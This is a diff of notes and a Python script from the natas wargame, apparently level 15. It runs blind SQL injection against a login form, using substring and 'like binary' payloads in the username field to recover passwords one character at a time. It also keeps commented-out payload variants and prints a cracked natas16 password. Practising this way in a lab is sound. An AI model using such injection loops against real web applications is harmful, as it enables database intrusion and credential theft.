@@ -566,7 +566,7 @@ success_msg = "This user exists."
 def record_length_enum(column="", length=-1):
     length_found = []
 
-    if (column == "" and length == -1):
+    if (column == "" or length == -1):
         return
     
     for num in range(length):
@@ -595,11 +595,11 @@ def record_enum(column="", lengths=[]):
         while (len(cracked[curr_cracked]) < lengths[curr_cracked]): # until we didnt finish cracking curr record
             for curr_char in all_charset: # try every char in all of the charsets                
                 # payload request
-                body["username"] = f"\"or (substring({column}, 1, {position}) = '{cracked[curr_cracked] + curr_char}');#"
+                body["username"] = f"natas16\" and (substring({column}, 1, {position}) like binary '{cracked[curr_cracked] + curr_char}%');#"
                 print(body["username"])
                 response = requests.post(url, headers=headers, data=body).text
                 print(response)
-
+                
                 if (success_msg in response):
                     cracked[curr_cracked] += curr_char
                     isStartedCharSet = False # if we get a success we didnt finish cracking yet
@@ -622,65 +622,44 @@ def record_enum(column="", lengths=[]):
 # ------------------------------------------------
 # part 1 - blind sqli to find rows lenth
 # ------------------------------------------------
-#
-#username_records_lengths = (record_length_enum("username", 50))
-#password_records_lengths  = (record_length_enum("password", 50))
-#
-#print(f"found (username) rows: {len(username_records_lengths)}")
-#[print(f"row {row_num + 1}, record length {username_records_lengths[row_num]}") 
-#for row_num in range((len(username_records_lengths)))]
-#
-#print(f"\nfound (password) rows: {len(password_records_lengths)}")
-#[print(f"row {row_num + 1}, record length {password_records_lengths[row_num]}") 
-#for row_num in range((len(password_records_lengths)))]
+
+# username_records_lengths = (record_length_enum("username", 50))
+# password_records_lengths  = (record_length_enum("password", 50))
+
+# print(f"found (username) rows: {len(username_records_lengths)}")
+# [print(f"row {row_num + 1}, record length {username_records_lengths[row_num]}") 
+# for row_num in range((len(username_records_lengths)))]
+
+# print(f"\nfound (password) rows: {len(password_records_lengths)}")
+# [print(f"row {row_num + 1}, record length {password_records_lengths[row_num]}") 
+# for row_num in range((len(password_records_lengths)))]
 
 
 # ------------------------------------------------
 # part 2 - blind sqli to crack rows (letter by letter)
 # ------------------------------------------------
 #print(record_enum("username", [3, 5, 7]))
-#print(record_enum("password", [10, 32]))
-
-
-# ------------------------------------------------
-# part 3 - reconfigure charset to skip existing cracked 
-# ------------------------------------------------
-# lower_charset = "abcdefghijklmnopqrstuvwxyz" # ==> ['ali', 'alice', '']
-# all_charset = lower_charset + upper_charset + numbers_charset
-# print(record_enum("username", [3, 5, 7]))
-
-# lower_charset = "bcdefghijklmnopqrstuvwxyza" # ==> ['bob', '', '']
-# all_charset = lower_charset + upper_charset + numbers_charset
-# print(record_enum("username", [3, 5, 7]))
-
-# lower_charset = "cdefghijklmnopqrstuvwxyzab" # ==> ['cha', 'charl', 'charlie']
-# all_charset = lower_charset + upper_charset + numbers_charset
-# print(record_enum("username", [3, 5, 7]))
-
-# lower_charset = "abcdefghijklmnopqrstuvwxyz" # ==> ['hlwugkts2w', '']
-# all_charset = lower_charset + upper_charset + numbers_charset
-# print(record_enum("password", [10, 32]))
-
-# lower_charset = "ijklmnopqrstuvwxyzabcdefgh" # ==> ['trd7izrd5g', 'trd7izrd5gatjj9pkpeuaolfejhqj32v']
-# all_charset = lower_charset + upper_charset + numbers_charset
-# print(record_enum("password", [10, 32]))
-
-# upper_charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" # ==> ['HLWUGKTS2W', '']
-# all_charset = upper_charset + lower_charset + numbers_charset
-# print(record_enum("password", [10, 32]))
-
-# upper_charset = "UVWXYZABCDEFGHIJKLMNOPQRST" # ==> ['TRD7IZRD5G', 'TRD7IZRD5GATJJ9PKPEUAOLFEJHQJ32V']
-# all_charset = upper_charset + lower_charset + numbers_charset
-# print(record_enum("password", [10, 32]))
-
-upper_charset = "UVWXYZABCDEFGHIJKLMNOPQRST" # ==> 
-all_charset = upper_charset + lower_charset + numbers_charset
 print(record_enum("password", [10, 32]))
 
 
-->
-charlie" and password='hlwugkts2w';# ==> user exists
-->
+# ------------------------------------------------
+# part 3 - reconfigure payload
+# ------------------------------------------------
+
+# original payload
+#body["username"] = f"\"or (substring({column}, 1, {position}) = '{cracked[curr_cracked] + curr_char}');#"
+
+
+# like binary is case sensetive since it compares the binary
+#body["username"] = f"\" and (substring({column}, 1, {position}) like binary '{cracked[curr_cracked] + curr_char}%');#"
+
+
+# to filter only natas16 password
+#body["username"] = f"natas16\" and (substring({column}, 1, {position}) like binary '{cracked[curr_cracked] + curr_char}%');#"
+            
+# natas16 : TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+
+
 
 
 lvl 17:
